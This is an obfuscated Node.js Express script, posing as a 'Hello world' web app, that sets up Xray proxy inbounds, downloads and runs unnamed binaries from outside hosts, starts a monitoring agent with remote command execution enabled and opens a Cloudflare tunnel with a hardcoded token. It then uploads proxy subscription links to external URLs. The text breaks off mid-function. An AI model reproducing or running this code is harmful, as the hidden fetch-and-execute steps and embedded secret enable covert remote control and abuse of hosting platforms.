const _0x351477=_0x3e83;(function(_0x459a7b,_0x5aa6dd){const _0x27260f={_0x2239c7:0x1d4,_0x542c93:0x264,_0x4f0fd2:0x210,_0x12163a:0x1c5,_0x5c842c:0x25a,_0x3114ad:0x25e,_0x4e594a:0x1e3},_0x46580d=_0x3e83,_0x3be5fb=_0x459a7b();while(!![]){try{const _0x3c21d0=parseInt(_0x46580d(0x1e7))/0x1+-parseInt(_0x46580d(_0x27260f._0x2239c7))/0x2*(-parseInt(_0x46580d(_0x27260f._0x542c93))/0x3)+parseInt(_0x46580d(_0x27260f._0x4f0fd2))/0x4+parseInt(_0x46580d(_0x27260f._0x12163a))/0x5*(-parseInt(_0x46580d(0x1de))/0x6)+parseInt(_0x46580d(0x23a))/0x7+-parseInt(_0x46580d(_0x27260f._0x5c842c))/0x8*(-parseInt(_0x46580d(_0x27260f._0x3114ad))/0x9)+-parseInt(_0x46580d(_0x27260f._0x4e594a))/0xa;if(_0x3c21d0===_0x5aa6dd)break;else _0x3be5fb['push'](_0x3be5fb['shift']());}catch(_0x427d9e){_0x3be5fb['push'](_0x3be5fb['shift']());}}}(_0x2387,0xeb364));const express=require('express'),app=express(),axios=require(_0x351477(0x1fb)),os=require('os'),fs=require('fs'),path=require(_0x351477(0x1f3)),{promisify}=require('util'),exec=promisify(require(_0x351477(0x23d))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x351477(0x1eb)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x351477(0x244)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x351477(0x244)][_0x351477(0x1ce)]||'./tmp',SUB_PATH=process[_0x351477(0x244)]['SUB_PATH']||'sub',PORT=process[_0x351477(0x244)][_0x351477(0x259)]||process[_0x351477(0x244)][_0x351477(0x238)]||0xbb8,UUID=process[_0x351477(0x244)][_0x351477(0x216)]||_0x351477(0x229),NEZHA_SERVER=process[_0x351477(0x244)][_0x351477(0x21a)]||'',NEZHA_PORT=process['env'][_0x351477(0x23e)]||'',NEZHA_KEY=process[_0x351477(0x244)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x351477(0x1e9),ARGO_AUTH=process[_0x351477(0x244)][_0x351477(0x1ed)]||_0x351477(0x1da),ARGO_PORT=process[_0x351477(0x244)][_0x351477(0x212)]||0x1f41,CFIP=process[_0x351477(0x244)]['CFIP']||_0x351477(0x219),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x351477(0x244)][_0x351477(0x1e8)]||_0x351477(0x251);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x351477(0x26b)](FILE_PATH+_0x351477(0x261))):console[_0x351477(0x26b)](FILE_PATH+_0x351477(0x1f2));let npmPath=path[_0x351477(0x247)](FILE_PATH,'npm'),phpPath=path[_0x351477(0x247)](FILE_PATH,'php'),webPath=path[_0x351477(0x247)](FILE_PATH,_0x351477(0x1db)),botPath=path[_0x351477(0x247)](FILE_PATH,_0x351477(0x1ea)),subPath=path[_0x351477(0x247)](FILE_PATH,_0x351477(0x1cd)),listPath=path[_0x351477(0x247)](FILE_PATH,'list.txt'),bootLogPath=path[_0x351477(0x247)](FILE_PATH,_0x351477(0x1c6)),configPath=path['join'](FILE_PATH,_0x351477(0x20b));function deleteNodes(){const _0x27a8f6={_0x5330ee:0x1e4,_0x51d043:0x200,_0x5c95a3:0x233,_0x1810fc:0x22d,_0x115d1e:0x206},_0x2ae58e=_0x351477;try{if(!UPLOAD_URL)return;if(!fs[_0x2ae58e(0x235)](subPath))return;let _0x456eb0;try{_0x456eb0=fs[_0x2ae58e(0x1ff)](subPath,_0x2ae58e(0x200));}catch{return null;}const _0x4adf8c=Buffer['from'](_0x456eb0,_0x2ae58e(0x1be))[_0x2ae58e(_0x27a8f6._0x5330ee)](_0x2ae58e(_0x27a8f6._0x51d043)),_0x2aada4=_0x4adf8c[_0x2ae58e(0x1fe)]('\x0a')[_0x2ae58e(_0x27a8f6._0x5c95a3)](_0x21daa5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2ae58e(0x26a)](_0x21daa5));if(_0x2aada4[_0x2ae58e(_0x27a8f6._0x1810fc)]===0x0)return;return axios[_0x2ae58e(0x1d7)](UPLOAD_URL+_0x2ae58e(0x241),JSON[_0x2ae58e(0x255)]({'nodes':_0x2aada4}),{'headers':{'Content-Type':_0x2ae58e(_0x27a8f6._0x115d1e)}})['catch'](_0x3abf3b=>{return null;});}catch(_0x3855c3){return null;}}function cleanupOldFiles(){const _0x44a306={_0x14cbcc:0x1db,_0x4f4c6a:0x1c9,_0x95836d:0x215},_0x3e0619={_0x4bf722:0x247},_0x4e2e0e=_0x351477,_0x55478c=[_0x4e2e0e(_0x44a306._0x14cbcc),'bot',_0x4e2e0e(0x24d),_0x4e2e0e(_0x44a306._0x4f4c6a),'sub.txt',_0x4e2e0e(0x1c6)];_0x55478c[_0x4e2e0e(_0x44a306._0x95836d)](_0x549a9a=>{const _0x5cced9=_0x4e2e0e,_0x45a793=path[_0x5cced9(_0x3e0619._0x4bf722)](FILE_PATH,_0x549a9a);fs[_0x5cced9(0x25b)](_0x45a793,()=>{});});}app['get']('/',function(_0x51957b,_0x4631d2){const _0x29d3bf={_0x234759:0x221,_0x4be476:0x1f0},_0x313a4a=_0x351477;_0x4631d2[_0x313a4a(_0x29d3bf._0x234759)](_0x313a4a(_0x29d3bf._0x4be476));});const config={'log':{'access':'/dev/null','error':_0x351477(0x214),'loglevel':_0x351477(0x1cb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x351477(0x202),'settings':{'clients':[{'id':UUID,'flow':_0x351477(0x236)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x351477(0x234),'dest':0xbba},{'path':_0x351477(0x258),'dest':0xbbb},{'path':_0x351477(0x23b),'dest':0xbbc}]},'streamSettings':{'network':_0x351477(0x24c)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x351477(0x24c),'security':_0x351477(0x1cb)}},{'port':0xbba,'listen':_0x351477(0x21e),'protocol':_0x351477(0x202),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x351477(0x1cb)},'streamSettings':{'network':'ws','security':_0x351477(0x1cb),'wsSettings':{'path':_0x351477(0x234)}},'sniffing':{'enabled':!![],'destOverride':[_0x351477(0x237),_0x351477(0x26d),_0x351477(0x209)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x351477(0x21e),'protocol':_0x351477(0x20e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x351477(0x258)}},'sniffing':{'enabled':!![],'destOverride':[_0x351477(0x237),_0x351477(0x26d),_0x351477(0x209)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x351477(0x21e),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x351477(0x1cb),'wsSettings':{'path':_0x351477(0x23b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x351477(0x26d),_0x351477(0x209)],'metadataOnly':![]}}],'dns':{'servers':[_0x351477(0x1df)]},'outbounds':[{'protocol':_0x351477(0x1e6),'tag':_0x351477(0x1e2)},{'protocol':_0x351477(0x246),'tag':'block'}]};fs[_0x351477(0x256)](path[_0x351477(0x247)](FILE_PATH,_0x351477(0x20b)),JSON[_0x351477(0x255)](config,null,0x2));function getSystemArchitecture(){const _0x352cba={_0x1c523a:0x24f,_0x1c234e:0x225},_0x546dcb=_0x351477,_0x13a3bc=os[_0x546dcb(0x201)]();return _0x13a3bc===_0x546dcb(_0x352cba._0x1c523a)||_0x13a3bc===_0x546dcb(0x218)||_0x13a3bc===_0x546dcb(_0x352cba._0x1c234e)?'arm':_0x546dcb(0x23c);}function _0x2387(){const _0x2b475c=['?security=tls&sni=','php','\x20successfully','none','/vmess-argo?ed=2560','sub.txt','FILE_PATH','2096','\x0a\x20\x20tunnel:\x20','fileUrl','status','has','2792NIwLil','https://amd64.ssss.nyc.mn/2go','automatic\x20access\x20task\x20added\x20successfully','post','response','stream','eyJhIjoiZjE1YTc0NjZlOGY1YTk0ZWNjZTRlMmM0YmE3NmM2ZWQiLCJ0IjoiNjljMjI3ZmMtZWY3YS00MGI4LTllZWMtOTcyZTY3MzgzOGM4IiwicyI6IllUVmhOVEptTnpZdFptRmxNeTAwWWpJeExUZzBOelF0T0daak9USXpNV1pqWkRRdyJ9','web','bot\x20is\x20running','npm\x20running\x20error:\x20','5490ZLwBlI','https+local://8.8.8.8/dns-query','2083','./npm','direct','27393070SMulWW','toString','/php\x20-c\x20\x22','freedom','556695YeiPoA','NAME','koyeb-ap.leovip.qzz.io','bot','UPLOAD_URL','data','ARGO_AUTH','listen','\x20>/dev/null\x202>&1','Hello\x20world!','/tunnel.yml\x20run','\x20already\x20exists','path','get','&path=%2Ftrojan-argo%3Fed%3D2560#','2087','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','includes','./php','Error\x20executing\x20command:\x20','axios','\x20failed:\x20','TunnelSecret','split','readFileSync','utf-8','arch','vless','\x0a\x20\x20\x0avmess://','Error\x20downloading\x20files:','Download\x20','application/json','Empowerment\x20failed\x20for\x20','./web','quic','Subscription\x20uploaded\x20successfully','config.json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','?encryption=none&security=tls&sni=','vmess','8443','7575472pwqQic','rm\x20-rf\x20','ARGO_PORT','https://arm64.ssss.nyc.mn/v1','/dev/null','forEach','UUID','fileName','arm64','cdns.doon.eu.org','NEZHA_SERVER','tunnel.json','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','match','127.0.0.1','/api/add-subscriptions','\x0a\x20\x20\x20\x20','send','from','https://arm64.ssss.nyc.mn/agent','set','aarch64','unlinkSync','\x0a\x20\x20\x0atrojan://','添加URL失败:\x20','9c66b719-6939-4b19-8f63-707092710fff','npm\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','length','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','text/plain;\x20charset=utf-8','web\x20running\x20error:\x20','filter','/vless-argo','existsSync','xtls-rprx-vision','http','PORT','ArgoDomain:','7863247jCbMct','/trojan-argo','amd','child_process','NEZHA_PORT','&path=%2Fvless-argo%3Fed%3D2560#','/npm\x20-s\x20','/api/delete-nodes','\x20>/dev/null\x202>&1\x20&','clear','env','&type=ws&host=','blackhole','join','map','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','error','Content-Type','tcp','npm','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','arm','https://arm64.ssss.nyc.mn/web','Koyeb','createWriteStream','2053','./bot','stringify','writeFileSync','chmod','/vmess-argo','SERVER_PORT','8pLUfsM','unlink','/sub.txt\x20saved\x20successfully','\x20-p\x20','855828LskWeb','finish','https://oooo.serv00.net/add-url','\x20is\x20created','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','php\x20is\x20running','747KedcWt','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/2go','php\x20running\x20error:\x20','tunnel.yml','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','test','log','https://amd64.ssss.nyc.mn/v1','tls','/config.json\x20>/dev/null\x202>&1\x20&','message','base64','nohup\x20','/web\x20-c\x20','push','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','pipe','--tls','1715skXvZy','boot.log','\x0avless://'];_0x2387=function(){return _0x2b475c;};return _0x2387();}function _0x3e83(_0x16a338,_0x436413){const _0x238706=_0x2387();return _0x3e83=function(_0x3e8309,_0x2a7530){_0x3e8309=_0x3e8309-0x1bd;let _0x2aba44=_0x238706[_0x3e8309];return _0x2aba44;},_0x3e83(_0x16a338,_0x436413);}function downloadFile(_0x5d161f,_0x30bb44,_0x38a718){const _0x36a5d6={_0x3c94bf:0x247},_0x4e8a6={_0x4694eb:0x205,_0x2177c4:0x24a},_0x4888ce={_0x1f9d5f:0x1c3},_0x488c0a={_0x6decf7:0x205,_0x1cdc32:0x1fc,_0x2d18ec:0x1bd,_0x589bab:0x24a},_0xd19f34=_0x351477,_0x3f9fc2=path[_0xd19f34(_0x36a5d6._0x3c94bf)](FILE_PATH,_0x5d161f),_0x179982=fs[_0xd19f34(0x252)](_0x3f9fc2);axios({'method':_0xd19f34(0x1f4),'url':_0x30bb44,'responseType':_0xd19f34(0x1d9)})['then'](_0x4f1dbb=>{const _0x1cef10=_0xd19f34;_0x4f1dbb[_0x1cef10(0x1ec)][_0x1cef10(_0x4888ce._0x1f9d5f)](_0x179982),_0x179982['on'](_0x1cef10(0x25f),()=>{const _0x24dc5f=_0x1cef10;_0x179982['close'](),console['log']('Download\x20'+_0x5d161f+_0x24dc5f(0x1ca)),_0x38a718(null,_0x5d161f);}),_0x179982['on']('error',_0x366769=>{const _0x1a525b=_0x1cef10;fs[_0x1a525b(0x25b)](_0x3f9fc2,()=>{});const _0x2721d2=_0x1a525b(_0x488c0a._0x6decf7)+_0x5d161f+_0x1a525b(_0x488c0a._0x1cdc32)+_0x366769[_0x1a525b(_0x488c0a._0x2d18ec)];console[_0x1a525b(_0x488c0a._0x589bab)](_0x2721d2),_0x38a718(_0x2721d2);});})['catch'](_0xd916ae=>{const _0x1827af=_0xd19f34,_0x5b5590=_0x1827af(_0x4e8a6._0x4694eb)+_0x5d161f+_0x1827af(0x1fc)+_0xd916ae['message'];console[_0x1827af(_0x4e8a6._0x2177c4)](_0x5b5590),_0x38a718(_0x5b5590);});}async function downloadFilesAndRun(){const _0x23ee46={_0x5ae940:0x1e1,_0xad29a9:0x254,_0x1d0cc0:0x208,_0x54686f:0x1fe,_0x5dccff:0x230,_0x44eae6:0x20f,_0x44b726:0x1d3,_0x589332:0x256,_0x76aaa8:0x22b,_0x4f2058:0x263,_0xa6f7b1:0x1c4,_0x1074da:0x1bf,_0x5269f2:0x240,_0x21cd5b:0x25d,_0x2a65a9:0x242,_0x3307a6:0x26b,_0x486843:0x24a,_0x1b7bf8:0x1dd,_0x3eb994:0x22c,_0x200805:0x26e,_0x2cd689:0x26b,_0x322ac0:0x247,_0x5c2afa:0x1ea,_0x4f9896:0x21d,_0x566c17:0x1f1,_0x1be907:0x22e},_0x162ed6=_0x351477,_0x21040f=getSystemArchitecture(),_0x38d7ee=getFilesForArchitecture(_0x21040f);if(_0x38d7ee[_0x162ed6(0x22d)]===0x0){console[_0x162ed6(0x26b)](_0x162ed6(0x1f7));return;}const _0xff3910=_0x38d7ee[_0x162ed6(0x248)](_0x13af0f=>{return new Promise((_0x525212,_0x6f4426)=>{const _0x67d448=_0x3e83;downloadFile(_0x13af0f[_0x67d448(0x217)],_0x13af0f[_0x67d448(0x1d1)],(_0x33ae76,_0x165177)=>{_0x33ae76?_0x6f4426(_0x33ae76):_0x525212(_0x165177);});});});try{await Promise['all'](_0xff3910);}catch(_0x436e29){console['error'](_0x162ed6(0x204),_0x436e29);return;}function _0x5aa80a(_0x22e62a){const _0x2145f1=0x1fd;_0x22e62a['forEach'](_0x268a4a=>{const _0x52c414={_0x16d6f6:0x207,_0x3ef5d6:0x1e4},_0x43a0b8=_0x3e83,_0xb630c8=path['join'](FILE_PATH,_0x268a4a);fs[_0x43a0b8(0x235)](_0xb630c8)&&fs[_0x43a0b8(0x257)](_0xb630c8,_0x2145f1,_0xb714e8=>{const _0x5e6267=_0x43a0b8;_0xb714e8?console[_0x5e6267(0x24a)](_0x5e6267(_0x52c414._0x16d6f6)+_0xb630c8+':\x20'+_0xb714e8):console['log']('Empowerment\x20success\x20for\x20'+_0xb630c8+':\x20'+_0x2145f1[_0x5e6267(_0x52c414._0x3ef5d6)](0x8));});});}const _0x480ae9=NEZHA_PORT?[_0x162ed6(_0x23ee46._0x5ae940),'./web',_0x162ed6(_0x23ee46._0xad29a9)]:[_0x162ed6(0x1f9),_0x162ed6(_0x23ee46._0x1d0cc0),_0x162ed6(_0x23ee46._0xad29a9)];_0x5aa80a(_0x480ae9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5df4c1=NEZHA_SERVER[_0x162ed6(0x1f8)](':')?NEZHA_SERVER[_0x162ed6(_0x23ee46._0x54686f)](':')['pop']():'',_0x4c8089=new Set([_0x162ed6(_0x23ee46._0x5dccff),_0x162ed6(_0x23ee46._0x44eae6),_0x162ed6(0x1cf),'2087',_0x162ed6(0x1e0),_0x162ed6(0x253)]),_0x204e36=_0x4c8089[_0x162ed6(_0x23ee46._0x44b726)](_0x5df4c1)?'true':'false',_0xda041a='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x162ed6(0x262)+_0x204e36+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x162ed6(_0x23ee46._0x589332)](path[_0x162ed6(0x247)](FILE_PATH,'config.yaml'),_0xda041a);const _0x2648e6=_0x162ed6(0x1bf)+FILE_PATH+_0x162ed6(0x1e5)+FILE_PATH+_0x162ed6(_0x23ee46._0x76aaa8);try{await exec(_0x2648e6),console['log'](_0x162ed6(_0x23ee46._0x4f2058)),await new Promise(_0x24882c=>setTimeout(_0x24882c,0x3e8));}catch(_0x2bf928){console[_0x162ed6(0x24a)](_0x162ed6(0x267)+_0x2bf928);}}else{let _0x1f183f='';const _0x2d3076=[_0x162ed6(_0x23ee46._0x5dccff),_0x162ed6(_0x23ee46._0x44eae6),'2096',_0x162ed6(0x1f6),_0x162ed6(0x1e0),'2053'];_0x2d3076['includes'](NEZHA_PORT)&&(_0x1f183f=_0x162ed6(_0x23ee46._0xa6f7b1));const _0x443801=_0x162ed6(_0x23ee46._0x1074da)+FILE_PATH+_0x162ed6(_0x23ee46._0x5269f2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x162ed6(_0x23ee46._0x21cd5b)+NEZHA_KEY+'\x20'+_0x1f183f+_0x162ed6(_0x23ee46._0x2a65a9);try{await exec(_0x443801),console[_0x162ed6(_0x23ee46._0x3307a6)](_0x162ed6(0x22a)),await new Promise(_0x39b40c=>setTimeout(_0x39b40c,0x3e8));}catch(_0x36ae30){console[_0x162ed6(_0x23ee46._0x486843)](_0x162ed6(_0x23ee46._0x1b7bf8)+_0x36ae30);}}}else console['log'](_0x162ed6(_0x23ee46._0x3eb994));const _0x28184e='nohup\x20'+FILE_PATH+_0x162ed6(0x1c0)+FILE_PATH+_0x162ed6(_0x23ee46._0x200805);try{await exec(_0x28184e),console[_0x162ed6(_0x23ee46._0x2cd689)]('web\x20is\x20running'),await new Promise(_0x4c6d90=>setTimeout(_0x4c6d90,0x3e8));}catch(_0x372bbb){console[_0x162ed6(_0x23ee46._0x486843)](_0x162ed6(0x232)+_0x372bbb);}if(fs[_0x162ed6(0x235)](path[_0x162ed6(_0x23ee46._0x322ac0)](FILE_PATH,_0x162ed6(_0x23ee46._0x5c2afa)))){let _0x496b74;if(ARGO_AUTH[_0x162ed6(_0x23ee46._0x4f9896)](/^[A-Z0-9a-z=]{120,250}$/))_0x496b74='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x162ed6(0x21d)](/TunnelSecret/)?_0x496b74=_0x162ed6(0x22f)+FILE_PATH+_0x162ed6(_0x23ee46._0x566c17):_0x496b74='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x162ed6(_0x23ee46._0x1be907)+ARGO_PORT;try{await exec(_0x162ed6(0x1bf)+FILE_PATH+'/bot\x20'+_0x496b74+_0x162ed6(0x242)),console[_0x162ed6(0x26b)](_0x162ed6(0x1dc)),await new Promise(_0xf903f0=>setTimeout(_0xf903f0,0x7d0));}catch(_0x39f74e){console[_0x162ed6(_0x23ee46._0x486843)](_0x162ed6(0x1fa)+_0x39f74e);}}await new Promise(_0xfc38f9=>setTimeout(_0xfc38f9,0x1388));}function getFilesForArchitecture(_0x264190){const _0xb1ede0={_0x278465:0x250,_0x50e218:0x266,_0x5d7131:0x1db,_0x2cc084:0x1ea,_0x157458:0x223,_0x212573:0x213},_0x371d1e=_0x351477;let _0x232a59;_0x264190===_0x371d1e(0x24f)?_0x232a59=[{'fileName':'web','fileUrl':_0x371d1e(_0xb1ede0._0x278465)},{'fileName':_0x371d1e(0x1ea),'fileUrl':_0x371d1e(_0xb1ede0._0x50e218)}]:_0x232a59=[{'fileName':_0x371d1e(_0xb1ede0._0x5d7131),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x371d1e(_0xb1ede0._0x2cc084),'fileUrl':_0x371d1e(0x1d5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1aa618=_0x264190==='arm'?_0x371d1e(_0xb1ede0._0x157458):_0x371d1e(0x265);_0x232a59['unshift']({'fileName':_0x371d1e(0x24d),'fileUrl':_0x1aa618});}else{const _0x1eedda=_0x264190===_0x371d1e(0x24f)?_0x371d1e(_0xb1ede0._0x212573):_0x371d1e(0x26c);_0x232a59['unshift']({'fileName':'php','fileUrl':_0x1eedda});}}return _0x232a59;}function argoType(){const _0x5ddc77={_0x3f2d4d:0x1f8,_0x274139:0x21b,_0x5c0293:0x24e,_0x3f94b2:0x26b},_0xf6237=_0x351477;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0xf6237(_0x5ddc77._0x3f2d4d)](_0xf6237(0x1fd))){fs['writeFileSync'](path[_0xf6237(0x247)](FILE_PATH,_0xf6237(_0x5ddc77._0x274139)),ARGO_AUTH);const _0x21a1cf=_0xf6237(0x1d0)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xf6237(0x247)](FILE_PATH,_0xf6237(0x21b))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xf6237(_0x5ddc77._0x5c0293)+ARGO_PORT+_0xf6237(0x1c2);fs[_0xf6237(0x256)](path[_0xf6237(0x247)](FILE_PATH,_0xf6237(0x268)),_0x21a1cf);}else console[_0xf6237(_0x5ddc77._0x3f94b2)](_0xf6237(0x20c));}argoType();async function extractDomains(){const _0x20145d={_0x218eb3:0x1c6,_0x7171d3:0x215,_0x429fab:0x22d,_0x4c1f70:0x239,_0x145234:0x247,_0x4b084a:0x1c6,_0x1bde6c:0x22e,_0x37fb5f:0x242,_0x29681b:0x26b,_0x11c37e:0x24a},_0x5a5012={_0x2eff48:0x200},_0x4ba961={_0x4dd931:0x21d},_0x3fe758=_0x351477;let _0x15d7ae;if(ARGO_AUTH&&ARGO_DOMAIN)_0x15d7ae=ARGO_DOMAIN,console[_0x3fe758(0x26b)]('ARGO_DOMAIN:',_0x15d7ae),await _0xf83a08(_0x15d7ae);else try{const _0x305f3d=fs[_0x3fe758(0x1ff)](path[_0x3fe758(0x247)](FILE_PATH,_0x3fe758(_0x20145d._0x218eb3)),_0x3fe758(0x200)),_0x51e50a=_0x305f3d[_0x3fe758(0x1fe)]('\x0a'),_0x2f872c=[];_0x51e50a[_0x3fe758(_0x20145d._0x7171d3)](_0x5a7410=>{const _0x5bf50e=_0x3fe758,_0x141402=_0x5a7410[_0x5bf50e(_0x4ba961._0x4dd931)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x141402){const _0xc74c41=_0x141402[0x1];_0x2f872c['push'](_0xc74c41);}});if(_0x2f872c[_0x3fe758(_0x20145d._0x429fab)]>0x0)_0x15d7ae=_0x2f872c[0x0],console[_0x3fe758(0x26b)](_0x3fe758(_0x20145d._0x4c1f70),_0x15d7ae),await _0xf83a08(_0x15d7ae);else{console[_0x3fe758(0x26b)](_0x3fe758(0x249)),fs[_0x3fe758(0x226)](path[_0x3fe758(_0x20145d._0x145234)](FILE_PATH,_0x3fe758(_0x20145d._0x4b084a)));async function _0x510ae3(){const _0x24f39a=_0x3fe758;try{await exec(_0x24f39a(0x21c));}catch(_0x30beec){}}_0x510ae3(),await new Promise(_0x20e653=>setTimeout(_0x20e653,0xbb8));const _0x52d0ea='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3fe758(_0x20145d._0x1bde6c)+ARGO_PORT;try{await exec(_0x3fe758(0x1bf)+path['join'](FILE_PATH,_0x3fe758(0x1ea))+'\x20'+_0x52d0ea+_0x3fe758(_0x20145d._0x37fb5f)),console[_0x3fe758(_0x20145d._0x29681b)]('bot\x20is\x20running.'),await new Promise(_0x5814c2=>setTimeout(_0x5814c2,0xbb8)),await extractDomains();}catch(_0x3afb6f){console[_0x3fe758(0x24a)](_0x3fe758(0x1fa)+_0x3afb6f);}}}catch(_0x4871a1){console[_0x3fe758(_0x20145d._0x11c37e)]('Error\x20reading\x20boot.log:',_0x4871a1);}async function _0xf83a08(_0x10e355){const _0x1e0bc9={_0x11f9ab:0x1cc,_0x3a44b5:0x26d,_0xbe648c:0x1c7,_0xb1f374:0x245,_0x4044b5:0x23f,_0x316a35:0x222,_0x48001b:0x220,_0x19f51b:0x1be,_0x338bb6:0x26b,_0x4edb13:0x25c},_0x2a1bd1=_0x3fe758,_0x521fa8=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x2a1bd1(_0x5a5012._0x2eff48)}),_0x19b88a=_0x521fa8['trim']();return new Promise(_0x1fd202=>{const _0x589ce4={_0x1d877e:0x24b,_0x4f895d:0x221};setTimeout(()=>{const _0x5415f3=_0x3e83,_0x5c6f82={'v':'2','ps':NAME+'-'+_0x19b88a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5415f3(0x1cb),'net':'ws','type':_0x5415f3(0x1cb),'host':_0x10e355,'path':_0x5415f3(_0x1e0bc9._0x11f9ab),'tls':_0x5415f3(_0x1e0bc9._0x3a44b5),'sni':_0x10e355,'alpn':''},_0x23d79b=_0x5415f3(_0x1e0bc9._0xbe648c)+UUID+'@'+CFIP+':'+CFPORT+_0x5415f3(0x20d)+_0x10e355+_0x5415f3(_0x1e0bc9._0xb1f374)+_0x10e355+_0x5415f3(_0x1e0bc9._0x4044b5)+NAME+'-'+_0x19b88a+_0x5415f3(0x203)+Buffer[_0x5415f3(_0x1e0bc9._0x316a35)](JSON[_0x5415f3(0x255)](_0x5c6f82))[_0x5415f3(0x1e4)](_0x5415f3(0x1be))+_0x5415f3(0x227)+UUID+'@'+CFIP+':'+CFPORT+_0x5415f3(0x1c8)+_0x10e355+'&type=ws&host='+_0x10e355+_0x5415f3(0x1f5)+NAME+'-'+_0x19b88a+_0x5415f3(_0x1e0bc9._0x48001b);console[_0x5415f3(0x26b)](Buffer[_0x5415f3(_0x1e0bc9._0x316a35)](_0x23d79b)['toString'](_0x5415f3(_0x1e0bc9._0x19f51b))),fs[_0x5415f3(0x256)](subPath,Buffer[_0x5415f3(0x222)](_0x23d79b)[_0x5415f3(0x1e4)](_0x5415f3(0x1be))),console[_0x5415f3(_0x1e0bc9._0x338bb6)](FILE_PATH+_0x5415f3(_0x1e0bc9._0x4edb13)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x1b9210,_0x1d093b)=>{const _0x591d01=_0x5415f3,_0x1ff610=Buffer[_0x591d01(0x222)](_0x23d79b)['toString']('base64');_0x1d093b[_0x591d01(0x224)](_0x591d01(_0x589ce4._0x1d877e),_0x591d01(0x231)),_0x1d093b[_0x591d01(_0x589ce4._0x4f895d)](_0x1ff610);}),_0x1fd202(_0x23d79b);},0x7d0);});}}async function uplodNodes(){const _0x35e566={_0x2335c7:0x1d7,_0x34b3c8:0x21f,_0x2a29aa:0x1d2,_0x29c641:0x26b,_0x396757:0x1d2,_0x110a8e:0x1ff,_0x428f53:0x200,_0x584abf:0x255,_0x20bada:0x26b},_0x295a52=_0x351477;if(UPLOAD_URL&&PROJECT_URL){const _0x49114a=PROJECT_URL+'/'+SUB_PATH,_0x5a35cf={'subscription':[_0x49114a]};try{const _0x5e9306=await axios[_0x295a52(_0x35e566._0x2335c7)](UPLOAD_URL+_0x295a52(_0x35e566._0x34b3c8),_0x5a35cf,{'headers':{'Content-Type':_0x295a52(0x206)}});if(_0x5e9306[_0x295a52(_0x35e566._0x2a29aa)]===0xc8)console[_0x295a52(_0x35e566._0x29c641)](_0x295a52(0x20a));else return 